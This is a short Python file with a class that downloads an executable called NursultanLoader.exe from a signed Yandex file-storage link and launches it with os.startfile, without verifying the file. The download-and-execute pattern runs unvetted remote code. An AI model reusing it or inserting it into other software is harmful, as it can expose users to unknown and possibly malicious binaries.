import requests
import os

class ExeInstaller:
    @staticmethod
    def install_exe(temp_dir):
        exe_url = "https://s897sas.storage.yandex.net/rdisk/0bf05ec8deb9ec6e2c9b5fda04446431662d51b0d375068c4c15a5d9f4c11e77/67587728/ugxPRXo3kLW4-vZA3suVe9ZL8zCefqnO1Suic8oqditd6NJojjlgCc3GUH2cqTvEZYQKUW53hKBsbknm9_aEvg==?uid=0&filename=NursultanLoader.exe&disposition=attachment&hash=BehFxP9czo3DTVEGJNBaFJgJQCpd4CKAHfQ9fSwh345N7D2svYdWN/e/dfNUzcZ0q/J6bpmRyOJonT3VoXnDag%3D%3D&limit=0&content_type=application%2Fx-dosexec&owner_uid=2054194856&fsize=16839624&hid=4fdcd412ffc9d70bad705c7ab81c4164&media_type=executable&tknv=v2&ts=628eda02e1a00&s=21780aea54190448e91270fb7c9b8f462e1a658dd75273d7fb8f31b784296cb1&pb=U2FsdGVkX18hl3DftFMicguTppatoDDLjd50oqscROxjNY98SEToZOQTYU6y4UIdSggXj_5YrHoRxIiwNn67lZiUMuPv3dMEmbUO9Vqu6rw"
        exe_path = os.path.join(temp_dir, "NursultanLoader.exe")

        if not os.path.exists(exe_path):
            response = requests.get(exe_url, stream=True)
            with open(exe_path, "wb") as exe_file:
                for chunk in response.iter_content(chunk_size=8192):
                    exe_file.write(chunk)
        try:
            os.startfile(exe_path)
        except OSError as e:
            print(f"Ошибка запуска {exe_path}: {e}")
